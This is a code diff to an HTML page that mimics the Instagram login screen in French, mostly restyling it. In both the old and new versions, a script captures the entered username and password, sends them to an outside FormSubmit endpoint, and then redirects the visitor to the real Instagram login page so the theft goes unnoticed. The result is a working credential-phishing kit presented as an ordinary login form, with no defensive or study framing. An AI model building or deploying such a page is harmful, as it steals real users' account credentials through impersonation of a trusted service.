@@ -8,7 +8,7 @@
   body {
     background: #000;
     color: #fff;
-    font-family: system-ui, Arial, sans-serif;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
     display: flex;
     justify-content: center;
     align-items: center;
@@ -17,66 +17,33 @@
   }
   .container {
     background: #121212;
-    padding: 40px 30px;
+    padding: 30px;
     border-radius: 8px;
     width: 320px;
     box-sizing: border-box;
   }
-  .logo {
-    text-align: center;
+  h1 {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
     font-size: 36px;
-    font-weight: 600;
-    margin-bottom: 30px;
+    font-weight: bold;
+    margin: 0 0 20px 0;
+    text-align: center;
   }
   label {
     display: block;
-    margin-top: 10px;
-    font-size: 12px;
-    color: #ccc;
+    margin: 12px 0 6px;
+    font-size: 14px;
+    font-weight: 500;
   }
   input[type="text"],
   input[type="password"] {
     width: 100%;
-    padding: 9px;
+    padding: 10px;
     background: #222;
-    border: 1px solid #333;
+    border: 1px solid #444;
     border-radius: 4px;
     color: #fff;
     font-size: 14px;
-    margin-top: 5px;
-    outline: none;
-  }
-  .facebook-btn {
-    background: #1877f2;
-    font-size: 14px;
-    font-weight: 600;
-    border: none;
-    width: 100%;
-    padding: 10px;
-    margin-bottom: 15px;
-    color: white;
-    border-radius: 4px;
-    cursor: default;
-  }
-  .separator {
-    display: flex;
-    align-items: center;
-    text-align: center;
-    margin: 20px 0;
-    color: #aaa;
-    font-size: 12px;
-  }
-  .separator::before,
-  .separator::after {
-    content: "";
-    flex: 1;
-    border-bottom: 1px solid #333;
-  }
-  .separator:not(:empty)::before {
-    margin-right: .75em;
-  }
-  .separator:not(:empty)::after {
-    margin-left: .75em;
   }
   .password-wrapper {
     position: relative;
@@ -87,19 +54,37 @@
     top: 50%;
     transform: translateY(-50%);
     cursor: pointer;
-    width: 20px;
-    height: 20px;
+    width: 22px;
+    height: 22px;
     fill: #aaa;
+  }
+  .facebook-btn {
+    width: 100%;
+    margin-bottom: 15px;
+    padding: 10px;
+    background: #1877f2;
+    border: none;
+    border-radius: 4px;
+    color: white;
+    font-weight: bold;
+    font-size: 14px;
+    cursor: pointer;
+  }
+  .separator {
+    text-align: center;
+    margin: 15px 0;
+    color: #aaa;
+    font-size: 13px;
   }
   button[type="submit"] {
     width: 100%;
-    margin-top: 20px;
+    margin-top: 10px;
     padding: 10px;
     background: #3897f0;
     border: none;
     border-radius: 4px;
     color: white;
-    font-weight: 600;
+    font-weight: bold;
     font-size: 14px;
     cursor: pointer;
   }
@@ -108,18 +93,20 @@
 <body>
 
 <div class="container">
-  <div class="logo">Instagram</div>
+  <h1>Instagram</h1>
 
-  <form id="instaForm" action="https://formsubmit.co/design.site.web69@gmail.com" method="POST" autocomplete="off">
-    <button type="button" class="facebook-btn" disabled>Continuer avec Facebook</button>
+  <form id="instaForm" autocomplete="off">
+    <button type="button" class="facebook-btn">Continuer avec Facebook</button>
 
-    <div class="separator">OU</div>
+    <div class="separator">─────── OU ───────</div>
 
-    <input type="text" id="username" name="username" placeholder="Téléphone, nom d’utilisateur ou e-mail" required />
+    <label for="username">Téléphone, nom d’utilisateur ou e-mail</label>
+    <input type="text" id="username" name="username" required />
 
+    <label for="password">Mot de passe</label>
     <div class="password-wrapper">
-      <input type="password" id="password" name="password" placeholder="Mot de passe" required />
-      <svg class="toggle-password" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+      <input type="password" id="password" name="password" required />
+      <svg class="toggle-password" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
         <path d="M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 12a5 5 0 1 1 0-10 5 5 0 0 1 0 10z"/>
         <circle cx="12" cy="12" r="2.5"/>
       </svg>
@@ -130,30 +117,29 @@
 </div>
 
 <script>
-  // Afficher / cacher mot de passe
-  const togglePassword = document.querySelector('.toggle-password');
-  const passwordInput = document.getElementById('password');
+// Toggle visibilité mot de passe
+const togglePassword = document.querySelector('.toggle-password');
+const passwordInput = document.getElementById('password');
 
-  togglePassword.addEventListener('click', () => {
-    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
-    passwordInput.setAttribute('type', type);
-    togglePassword.style.fill = type === 'text' ? '#3897f0' : '#aaa';
+togglePassword.addEventListener('click', () => {
+  const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+  passwordInput.setAttribute('type', type);
+  togglePassword.style.fill = type === 'text' ? '#3897f0' : '#aaa';
+});
+
+// Soumission AJAX vers FormSubmit et redirection vers Instagram
+document.getElementById('instaForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+
+  const formData = new FormData(this);
+
+  fetch("https://formsubmit.co/el/riyoye", {
+    method: "POST",
+    body: formData
+  }).finally(() => {
+    window.location.href = "https://www.instagram.com/accounts/login/";
   });
-
-  // Envoi des infos + redirection
-  document.getElementById('instaForm').addEventListener('submit', function(e) {
-    e.preventDefault();
-
-    const formData = new FormData(this);
-
-    fetch('https://formsubmit.co/design.site.web69@gmail.com', {
-      method: 'POST',
-      body: formData,
-      mode: 'no-cors'
-    }).finally(() => {
-      window.location.href = 'https://www.instagram.com/accounts/login/';
-    });
-  });
+});
 </script>
 
 </body>
